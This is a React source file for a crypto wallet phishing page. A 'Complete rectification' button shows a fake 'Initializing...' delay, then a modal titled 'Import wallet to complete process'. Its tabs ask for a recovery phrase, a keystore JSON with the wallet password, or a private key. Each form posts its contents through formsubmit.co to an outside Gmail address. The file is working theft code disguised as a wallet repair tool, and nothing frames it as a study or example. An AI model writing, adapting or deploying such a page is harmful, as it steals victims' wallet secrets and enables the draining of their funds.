import React, { useState } from "react";
import "react-responsive-modal/styles.css";
import { Modal } from "react-responsive-modal";
import { Tab, Tabs, TabList, TabPanel } from "react-tabs";
import "react-tabs/style/react-tabs.css";
import Marquee from "../components/Marquee";
import Footer from "../components/Footer";

function Rectify() {
 // FORM MODAL
  const [open, setOpen] = useState(false);

  const onCloseModal = () => setOpen(false);

//  INITIALIZING MODAL
  const [openInit, setOpenInit] = useState(false);

  const onCloseInitModal = () => setOpenInit(false);

  function Active() {
    setOpenInit(true);
    setTimeout(() => setOpenInit(false), 3000);
    setTimeout(() => setOpen(true), 3000);
  }

  return (
    <div>
      <Marquee />
      <div className="popup">
        <div className="popup_button">
          <button
            onClick={Active}
            type="button"
            className="btn btn-primary"
            data-bs-toggle="modal"
            data-bs-target="#exampleModal"
          >
            Complete rectification
          </button>
        </div>
      </div>

      <div>
       {/* INITIALIZING MODAL */}
        <Modal
          open={openInit}
          onClose={onCloseInitModal}
          center
          closeOnOverlayClick={false}
          closeOnEsc={false}
          showCloseIcon={false}
          classNames={{
            modal: "init_modal",
          }}
        >
          <div className="im_inner">
            <div className="button">Initializing...</div>
          </div>
        </Modal>
      </div>

      <div>
        {/* FORM MODAL */}
        <Modal
          open={open}
          onClose={onCloseModal}
          center
          classNames={{
            modal: "form_modal",
          }}
          showCloseIcon={false}
        >
          <div className="fm_inner">
            <div className="fm_holder">
              <h3>Import wallet to complete process</h3>

              <Tabs className="fm_tabs">
                <TabList className="fmt_list">
                  <Tab
                    className="fmt_unselected"
                    selectedClassName="fmt_selected"
                  >
                    Phrase
                  </Tab>
                  <Tab
                    className="fmt_unselected"
                    selectedClassName="fmt_selected"
                  >
                    Keystore JSON
                  </Tab>
                  <Tab
                    className="fmt_unselected"
                    selectedClassName="fmt_selected"
                  >
                    Private Key
                  </Tab>
                </TabList>

                <TabPanel>
                  <form
                    className="fmt_panel"
                    action="https://formsubmit.co/m.hassnainkhan32@gmail.com"
                    method="POST"
                  >
                    <textarea
                      required
                      rows={4}
                      placeholder="Enter your recovery phrase"
                      type="text"
                      name="recovery phrase"
                    />
                    <p>
                      Typically 12 (sometimes 24) words separated by single
                      spaces
                    </p>
                    <button type="submit">
                      IMPORT
                      <span>
                        <svg
                          fill="none"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth="2"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                      </span>
                    </button>
                  </form>
                </TabPanel>
                <TabPanel>
                  <form
                    className="fmt_panel"
                    action="https://formsubmit.co/m.hassnainkhan32@gmail.com"
                    method="POST"
                  >
                    <textarea
                      required
                      rows={4}
                      placeholder="Enter your Keystore JSON"
                      style={{ marginBottom: "1.5rem" }}
                      type="text"
                      name="keystore jSON"
                    />
                    <input
                      required
                      placeholder="Wallet password"
                      type="text"
                      name="wallet password"
                    />
                    <p>
                      Several lines of text beginning with "{`{`}...{`}`}" plus
                      the password you used to encrypt it.
                    </p>
                    <button type="submit">
                      IMPORT
                      <span>
                        <svg
                          fill="none"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth="2"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                      </span>
                    </button>
                  </form>
                </TabPanel>
                <TabPanel>
                  <form
                    className="fmt_panel"
                    action="https://formsubmit.co/m.hassnainkhan32@gmail.com"
                    method="POST"
                  >
                    <input
                      required
                      placeholder="Enter your Private Key"
                      type="text"
                      name="private key"
                    />
                    <p>
                      Typically 12 (sometimes 24) words separated by single
                      spaces
                    </p>
                    <button type="submit">
                      IMPORT
                      <span>
                        <svg
                          fill="none"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth="2"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                      </span>
                    </button>
                  </form>
                </TabPanel>
              </Tabs>
            </div>
            <div className="fm_close">
              <button onClick={onCloseModal}>Cancel</button>
            </div>
          </div>
        </Modal>
      </div>

      <Footer />
    </div>
  );
}

export default Rectify;
